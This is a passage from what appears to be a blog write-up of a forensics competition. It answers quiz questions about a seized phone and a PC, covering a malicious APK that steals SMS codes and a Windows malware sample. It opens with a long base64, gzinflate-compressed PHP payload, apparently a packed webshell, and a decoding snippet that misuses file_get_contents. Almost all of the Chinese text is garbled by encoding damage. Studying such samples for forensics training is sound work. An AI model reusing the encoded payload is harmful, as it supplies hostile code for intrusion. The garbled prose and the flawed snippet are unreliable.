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&quot;, $s_pass); ?&gt;&#x27;</span>; <span class="comment">// base64ç¼–ç </span></span><br><span class="line"><span class="variable">$File</span> = <span class="string">&#x27;test.php&#x27;</span>;<span class="comment">//è§£ç åä¿å­˜çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$Temp</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Code</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">gzinflate</span>(<span class="variable">$Temp</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;test.php&quot;</span>,<span class="variable">$temp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-174640358.png" class="">  </p><h3 id="27-å¤šé€‰é¢˜-è§£å‹åçš„è„šæœ¬æ–‡ä»¶å†…æœ‰ç”šä¹ˆåŠŸèƒ½-3åˆ†"><a href="#27-å¤šé€‰é¢˜-è§£å‹åçš„è„šæœ¬æ–‡ä»¶å†…æœ‰ç”šä¹ˆåŠŸèƒ½-3åˆ†" class="headerlink" title="27. [å¤šé€‰é¢˜] è§£å‹åçš„è„šæœ¬æ–‡ä»¶å†…æœ‰ç”šä¹ˆåŠŸèƒ½? (3åˆ†)"></a>27. [å¤šé€‰é¢˜] è§£å‹åçš„è„šæœ¬æ–‡ä»¶å†…æœ‰ç”šä¹ˆåŠŸèƒ½? (3åˆ†)</h3><p>A. ç¼–è¾‘æ–‡ä»¶</p><p>B. åˆ é™¤æ–‡ä»¶</p><p>C. æ›´æ”¹ç”¨æˆ·å¯†ç </p><p>D. åŠ å¯†æ–‡ä»¶</p><p>E. é‡æ–°å‘½åæ–‡ä»¶<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-175226596.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-175244099.png" class="">  </p><p>ABE</p><h3 id="28-å•é€‰é¢˜-è§£å‹åçš„è„šæœ¬å«æœ‰å‹ç¼©åŠŸèƒ½ï¼Œå½“ä¸­ä½¿ç”¨çš„è§£å‹æ–¹æ³•æ˜¯ç”šä¹ˆ-2åˆ†"><a href="#28-å•é€‰é¢˜-è§£å‹åçš„è„šæœ¬å«æœ‰å‹ç¼©åŠŸèƒ½ï¼Œå½“ä¸­ä½¿ç”¨çš„è§£å‹æ–¹æ³•æ˜¯ç”šä¹ˆ-2åˆ†" class="headerlink" title="28. [å•é€‰é¢˜] è§£å‹åçš„è„šæœ¬å«æœ‰å‹ç¼©åŠŸèƒ½ï¼Œå½“ä¸­ä½¿ç”¨çš„è§£å‹æ–¹æ³•æ˜¯ç”šä¹ˆ? (2åˆ†)"></a>28. [å•é€‰é¢˜] è§£å‹åçš„è„šæœ¬å«æœ‰å‹ç¼©åŠŸèƒ½ï¼Œå½“ä¸­ä½¿ç”¨çš„è§£å‹æ–¹æ³•æ˜¯ç”šä¹ˆ? (2åˆ†)</h3><p>A. PclZip.php</p><p>B. Unzip_gz()</p><p>C. ZipArchive()</p><p>D. ä»¥ä¸Šçš†å¦<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-175518504.png" class=""><br>æœä¸€ä¸‹å¯ä»¥æœåˆ°ZipArchive</p><h1 id="ç‰¹æ™®"><a href="#ç‰¹æ™®" class="headerlink" title="ç‰¹æ™®"></a>ç‰¹æ™®</h1><h2 id="æ‰‹æœº"><a href="#æ‰‹æœº" class="headerlink" title="æ‰‹æœº"></a>æ‰‹æœº</h2><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-183426521.png" class="">  <p>è®¾ç½®é‡Œè°ƒä¸ªä¸­æ–‡</p><h3 id="29-å¤šé€‰é¢˜-ç‰¹æ™®çš„ç”µè¯ä¸­ä¸€å¼ äº2021å¹´09æœˆ30æ—¥-10-45-12æ‹æ‘„çš„ç›¸ç‰‡åŒ…å«ä»¥ä¸‹å“ªäº›å­—-1åˆ†"><a href="#29-å¤šé€‰é¢˜-ç‰¹æ™®çš„ç”µè¯ä¸­ä¸€å¼ äº2021å¹´09æœˆ30æ—¥-10-45-12æ‹æ‘„çš„ç›¸ç‰‡åŒ…å«ä»¥ä¸‹å“ªäº›å­—-1åˆ†" class="headerlink" title="29. [å¤šé€‰é¢˜] ç‰¹æ™®çš„ç”µè¯ä¸­ä¸€å¼ äº2021å¹´09æœˆ30æ—¥ 10:45:12æ‹æ‘„çš„ç›¸ç‰‡åŒ…å«ä»¥ä¸‹å“ªäº›å­—? (1åˆ†)"></a>29. [å¤šé€‰é¢˜] ç‰¹æ™®çš„ç”µè¯ä¸­ä¸€å¼ äº2021å¹´09æœˆ30æ—¥ 10:45:12æ‹æ‘„çš„ç›¸ç‰‡åŒ…å«ä»¥ä¸‹å“ªäº›å­—? (1åˆ†)</h3><p>A. ç²¾å¿ </p><p>B. æŠ¥å›½</p><p>C. å¿ è¯š</p><p>D. å‹‡æ¯…<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-184434778.png" class=""><br>ç›´æ¥æœç´¢21å¹´åçš„ï¼Œæ‰¾åˆ°äºŒç»´ç æ‰«æã€‚<br>CD</p><h3 id="30-å¤šé€‰é¢˜-ç‰¹æ™®çš„ç”µè¯ä¸­çš„whatsappè´¦å·85268421495-s-whatsapp-netä¸­ï¼Œæœ‰å“ªäº›å…¶ä»–äººçš„WhatsAppç”¨æˆ·æ•°æ®è®°å½•-2åˆ†"><a href="#30-å¤šé€‰é¢˜-ç‰¹æ™®çš„ç”µè¯ä¸­çš„whatsappè´¦å·85268421495-s-whatsapp-netä¸­ï¼Œæœ‰å“ªäº›å…¶ä»–äººçš„WhatsAppç”¨æˆ·æ•°æ®è®°å½•-2åˆ†" class="headerlink" title="30. [å¤šé€‰é¢˜] ç‰¹æ™®çš„ç”µè¯ä¸­çš„whatsappè´¦å·85268421495@s.whatsapp.netä¸­ï¼Œæœ‰å“ªäº›å…¶ä»–äººçš„WhatsAppç”¨æˆ·æ•°æ®è®°å½•? ) (2åˆ†)"></a>30. [å¤šé€‰é¢˜] ç‰¹æ™®çš„ç”µè¯ä¸­çš„whatsappè´¦å·85268421495@s.whatsapp.netä¸­ï¼Œæœ‰å“ªäº›å…¶ä»–äººçš„WhatsAppç”¨æˆ·æ•°æ®è®°å½•? ) (2åˆ†)</h3><p>A. 85222117188@s.whatsapp.net</p><p>B. 85289853825@s.whatsapp.net</p><p>C. 85264795287@s.whatsapp.net</p><p>D. 85231882226@s.whatsapp.net</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-185708158.png" class="">  <p>æˆ‘ä»¬å†è”ç³»äººå¯ä»¥æ‰¾åˆ°å…¶æ•°æ®åº“çš„æºæ–‡ä»¶ã€‚<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-185911495.png" class=""><br>å†æ•°æ®åº“é‡Œæ‰¾åˆ°å…¶ä»–äººçš„whatappè´¦å·<br>A.D</p><h3 id="31-å•é€‰é¢˜-ç‰¹æ™®ç”µè¯çš„çƒ­ç‚¹åˆ†äº«å¯†ç æ˜¯ä»€ä¹ˆ-1åˆ†"><a href="#31-å•é€‰é¢˜-ç‰¹æ™®ç”µè¯çš„çƒ­ç‚¹åˆ†äº«å¯†ç æ˜¯ä»€ä¹ˆ-1åˆ†" class="headerlink" title="31. [å•é€‰é¢˜] ç‰¹æ™®ç”µè¯çš„çƒ­ç‚¹åˆ†äº«å¯†ç æ˜¯ä»€ä¹ˆ? (1åˆ†)"></a>31. [å•é€‰é¢˜] ç‰¹æ™®ç”µè¯çš„çƒ­ç‚¹åˆ†äº«å¯†ç æ˜¯ä»€ä¹ˆ? (1åˆ†)</h3><p>A. 12345678</p><p>B. 69447401bceb</p><p>C. Jioijo4542554</p><p>D. Dak Pou Home<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-190317113.png" class=""><br>B</p><h3 id="32-å¤šé€‰é¢˜-ç‰¹æ™®äºç»çº¬åº¦22-278843-114-165783ï¼Œæ²¡æœ‰åšä»€ä¹ˆ-2åˆ†"><a href="#32-å¤šé€‰é¢˜-ç‰¹æ™®äºç»çº¬åº¦22-278843-114-165783ï¼Œæ²¡æœ‰åšä»€ä¹ˆ-2åˆ†" class="headerlink" title="32. [å¤šé€‰é¢˜] ç‰¹æ™®äºç»çº¬åº¦22.278843, 114.165783ï¼Œæ²¡æœ‰åšä»€ä¹ˆ? (2åˆ†)"></a>32. [å¤šé€‰é¢˜] ç‰¹æ™®äºç»çº¬åº¦22.278843, 114.165783ï¼Œæ²¡æœ‰åšä»€ä¹ˆ? (2åˆ†)</h3><p>A. æ‹å½±ç‰‡</p><p>B. æ‹ç…§</p><p>C. ä½¿ç”¨google map</p><p>D. åœ¨Whatsappä¸­åˆ†äº«å®æ—¶ä½ç½®</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-190410451.png" class="">  <p>A,C,D</p><h3 id="33-å¤šé€‰é¢˜-ç‰¹æ™®äºç”µè¯ä¸­å®‰è£…äº†ä¸€ä¸ªå¯ç–‘è½¯ä»¶-ç‰ˆæœ¬ä¸º2020033001-ï¼Œè·Ÿæ®è¯¥å¯ç–‘è½¯ä»¶çš„å®‰è£…æ¡£ï¼Œä¸‹åˆ—å“ªé¡¹æè¿°æ­£ç¡®-2åˆ†"><a href="#33-å¤šé€‰é¢˜-ç‰¹æ™®äºç”µè¯ä¸­å®‰è£…äº†ä¸€ä¸ªå¯ç–‘è½¯ä»¶-ç‰ˆæœ¬ä¸º2020033001-ï¼Œè·Ÿæ®è¯¥å¯ç–‘è½¯ä»¶çš„å®‰è£…æ¡£ï¼Œä¸‹åˆ—å“ªé¡¹æè¿°æ­£ç¡®-2åˆ†" class="headerlink" title="33. [å¤šé€‰é¢˜] ç‰¹æ™®äºç”µè¯ä¸­å®‰è£…äº†ä¸€ä¸ªå¯ç–‘è½¯ä»¶(ç‰ˆæœ¬ä¸º2020033001)ï¼Œè·Ÿæ®è¯¥å¯ç–‘è½¯ä»¶çš„å®‰è£…æ¡£ï¼Œä¸‹åˆ—å“ªé¡¹æè¿°æ­£ç¡®? (2åˆ†)"></a>33. [å¤šé€‰é¢˜] ç‰¹æ™®äºç”µè¯ä¸­å®‰è£…äº†ä¸€ä¸ªå¯ç–‘è½¯ä»¶(ç‰ˆæœ¬ä¸º2020033001)ï¼Œè·Ÿæ®è¯¥å¯ç–‘è½¯ä»¶çš„å®‰è£…æ¡£ï¼Œä¸‹åˆ—å“ªé¡¹æè¿°æ­£ç¡®? (2åˆ†)</h3><p>A. è½¯ä»¶åç§°æ˜¯å®‰å…¨é˜²æŠ¤</p><p>B. è½¯ä»¶åç§°æ˜¯å®‰å¿ƒå›å®¶</p><p>C. è½¯ä»¶ç­¾å(signAlgorithm)ä»¥ SHA512withRSAåŠ å¯†</p><p>D. å°åŒ…åç§°(packageName)æ˜¯org.chromium.webapk.a5b80edf82b436506_v2<br>æœç´¢ç‰ˆæœ¬å·å¯ä»¥æ‰¾åˆ°å…¶apkä½ç½®<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-192015233.png" class=""><br>å°†å…¶å¯¼å‡ºåæ”¾åˆ°é›·ç”µapkå–è¯é‡Œ<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-192446420.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-192609202.png" class="">  </p><p>A</p><h3 id="34-å¤šé€‰é¢˜-ç‰¹æ™®äºç”µè¯ä¸­å®‰è£…äº†ä¸€ä¸ªå¯ç–‘è½¯ä»¶-ç‰ˆæœ¬ä¸º2020033001-ï¼Œè·Ÿæ®è¯¥å¯ç–‘è½¯ä»¶çš„å®‰è£…æ¡£ï¼Œå¯ç–‘è½¯ä»¶ä¸­æ¶‰åŠä»¥ä¸‹å®‰å…¨è®¸å¯-2åˆ†"><a href="#34-å¤šé€‰é¢˜-ç‰¹æ™®äºç”µè¯ä¸­å®‰è£…äº†ä¸€ä¸ªå¯ç–‘è½¯ä»¶-ç‰ˆæœ¬ä¸º2020033001-ï¼Œè·Ÿæ®è¯¥å¯ç–‘è½¯ä»¶çš„å®‰è£…æ¡£ï¼Œå¯ç–‘è½¯ä»¶ä¸­æ¶‰åŠä»¥ä¸‹å®‰å…¨è®¸å¯-2åˆ†" class="headerlink" title="34. [å¤šé€‰é¢˜] ç‰¹æ™®äºç”µè¯ä¸­å®‰è£…äº†ä¸€ä¸ªå¯ç–‘è½¯ä»¶(ç‰ˆæœ¬ä¸º2020033001)ï¼Œè·Ÿæ®è¯¥å¯ç–‘è½¯ä»¶çš„å®‰è£…æ¡£ï¼Œå¯ç–‘è½¯ä»¶ä¸­æ¶‰åŠä»¥ä¸‹å®‰å…¨è®¸å¯? (2åˆ†)"></a>34. [å¤šé€‰é¢˜] ç‰¹æ™®äºç”µè¯ä¸­å®‰è£…äº†ä¸€ä¸ªå¯ç–‘è½¯ä»¶(ç‰ˆæœ¬ä¸º2020033001)ï¼Œè·Ÿæ®è¯¥å¯ç–‘è½¯ä»¶çš„å®‰è£…æ¡£ï¼Œå¯ç–‘è½¯ä»¶ä¸­æ¶‰åŠä»¥ä¸‹å®‰å…¨è®¸å¯? (2åˆ†)</h3><p>A. android.permission.READ_SMSè¯»å–çŸ­ä¿¡å†…å®¹</p><p>B. android.permission.SEND_SMSå‘é€çŸ­ä¿¡</p><p>C. android.permission.READ_CONTACTSè¯»å–è”ç³»äºº</p><p>D. android.permission.BLUETOOTHä½¿ç”¨è“ç‰™</p><p>E. android.permission.CLEAR_APP_CACHEæ¸…é™¤åº”ç”¨ç¼“å­˜</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-192739205.png" class="">  <p>ABC</p><h3 id="35-å¡«ç©ºé¢˜-ç‰¹æ™®å¯èƒ½åœ¨ç”µè¯ä¸­è¢«å¯ç–‘è½¯ä»¶çªƒå–äº†çš„éªŒè¯ç æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2åˆ†"><a href="#35-å¡«ç©ºé¢˜-ç‰¹æ™®å¯èƒ½åœ¨ç”µè¯ä¸­è¢«å¯ç–‘è½¯ä»¶çªƒå–äº†çš„éªŒè¯ç æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2åˆ†" class="headerlink" title="35. [å¡«ç©ºé¢˜] ç‰¹æ™®å¯èƒ½åœ¨ç”µè¯ä¸­è¢«å¯ç–‘è½¯ä»¶çªƒå–äº†çš„éªŒè¯ç æ˜¯ä»€ä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (2åˆ†)"></a>35. [å¡«ç©ºé¢˜] ç‰¹æ™®å¯èƒ½åœ¨ç”µè¯ä¸­è¢«å¯ç–‘è½¯ä»¶çªƒå–äº†çš„éªŒè¯ç æ˜¯ä»€ä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-195557395.png" class="">  <p>113476<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-200316437.png" class=""><br>åœ¨apké‡Œå¯ä»¥æ‰¾åˆ°String.xmlå¤§æ¦‚ç‡ä¸ºæŠ“å–å­—ç¬¦çš„å…³é”®è¯</p><h2 id="è®¡ç®—æœº"><a href="#è®¡ç®—æœº" class="headerlink" title="è®¡ç®—æœº"></a>è®¡ç®—æœº</h2><h3 id="36-å¡«ç©ºé¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„åŠ å£³-Packing-æ–¹æ³•æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™ä½œç­”-2åˆ†"><a href="#36-å¡«ç©ºé¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„åŠ å£³-Packing-æ–¹æ³•æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™ä½œç­”-2åˆ†" class="headerlink" title="36. [å¡«ç©ºé¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„åŠ å£³(Packing)æ–¹æ³•æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™ä½œç­”) (2åˆ†)"></a>36. [å¡«ç©ºé¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„åŠ å£³(Packing)æ–¹æ³•æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™ä½œç­”) (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-210705741.png" class="">  <p>åœ¨ä¸‹è½½é‡Œå¯ä»¥æ‰¾åˆ°æ¶æ„æ–‡ä»¶,ä¸¢åˆ°æŸ¥å£³è½¯ä»¶é‡Œ.</p><h3 id="37-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ç¼–è¯‘å·¥å…·æ˜¯ç”šä¹ˆ-2åˆ†"><a href="#37-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ç¼–è¯‘å·¥å…·æ˜¯ç”šä¹ˆ-2åˆ†" class="headerlink" title="37. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ç¼–è¯‘å·¥å…·æ˜¯ç”šä¹ˆ? (2åˆ†)"></a>37. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ç¼–è¯‘å·¥å…·æ˜¯ç”šä¹ˆ? (2åˆ†)</h3><p>A. GCC</p><p>B. Borland</p><p>C. TCC</p><p>D. Microsoft Visual C/C++<br>æŸ¥çœ‹è½¯ä»¶ä¹Ÿç»™å‡ºäº†é€‰D</p><h3 id="38-å¡«ç©ºé¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ç¼–è¯‘è€…ä½¿ç”¨å¯èƒ½ä½¿ç”¨çš„è´¦æˆ·åç§°æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™ä½œç­”-3åˆ†"><a href="#38-å¡«ç©ºé¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ç¼–è¯‘è€…ä½¿ç”¨å¯èƒ½ä½¿ç”¨çš„è´¦æˆ·åç§°æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™ä½œç­”-3åˆ†" class="headerlink" title="38. [å¡«ç©ºé¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ç¼–è¯‘è€…ä½¿ç”¨å¯èƒ½ä½¿ç”¨çš„è´¦æˆ·åç§°æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™ä½œç­”) (3åˆ†)"></a>38. [å¡«ç©ºé¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ç¼–è¯‘è€…ä½¿ç”¨å¯èƒ½ä½¿ç”¨çš„è´¦æˆ·åç§°æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™ä½œç­”) (3åˆ†)</h3><h3 id="39-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„è‡ªæˆ‘å¤åˆ¶ä½ç½®æ˜¯ç”šä¹ˆ-2åˆ†"><a href="#39-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„è‡ªæˆ‘å¤åˆ¶ä½ç½®æ˜¯ç”šä¹ˆ-2åˆ†" class="headerlink" title="39. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„è‡ªæˆ‘å¤åˆ¶ä½ç½®æ˜¯ç”šä¹ˆ? (2åˆ†)"></a>39. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„è‡ªæˆ‘å¤åˆ¶ä½ç½®æ˜¯ç”šä¹ˆ? (2åˆ†)</h3><p>A. C:\Temp\temp.txt</p><p>B. C:\Users\<profile>\Desktop\malware.exe</p><p>C. C:\Users\public\malware.exe</p><p>D. C:\a.txt</p><h3 id="40-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ä¿®æ”¹ç™»å½•æ–‡ä»¶ä½ç½®æ˜¯ç”šä¹ˆ-3åˆ†"><a href="#40-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ä¿®æ”¹ç™»å½•æ–‡ä»¶ä½ç½®æ˜¯ç”šä¹ˆ-3åˆ†" class="headerlink" title="40. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ä¿®æ”¹ç™»å½•æ–‡ä»¶ä½ç½®æ˜¯ç”šä¹ˆ? (3åˆ†)"></a>40. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’çš„ä¿®æ”¹ç™»å½•æ–‡ä»¶ä½ç½®æ˜¯ç”šä¹ˆ? (3åˆ†)</h3><p>A. HKLM\Software\Microsoft\Windows\CurrentVersion\Run</p><p>B. HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</p><p>C. HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</p><p>D.HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background</p><h3 id="41-å¤šé€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’ç•™ä¸‹äº†ASCII-ART-ASCIIè‰ºæœ¯-æ–‡å­—å›¾-ï¼Œä»¥ä¸‹å“ªä¸ªä¸æ˜¯ç—…æ¯’ç•™ä¸‹-3åˆ†"><a href="#41-å¤šé€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’ç•™ä¸‹äº†ASCII-ART-ASCIIè‰ºæœ¯-æ–‡å­—å›¾-ï¼Œä»¥ä¸‹å“ªä¸ªä¸æ˜¯ç—…æ¯’ç•™ä¸‹-3åˆ†" class="headerlink" title="41. [å¤šé€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’ç•™ä¸‹äº†ASCII ART(ASCIIè‰ºæœ¯, æ–‡å­—å›¾)ï¼Œä»¥ä¸‹å“ªä¸ªä¸æ˜¯ç—…æ¯’ç•™ä¸‹? (3åˆ†)"></a>41. [å¤šé€‰é¢˜] 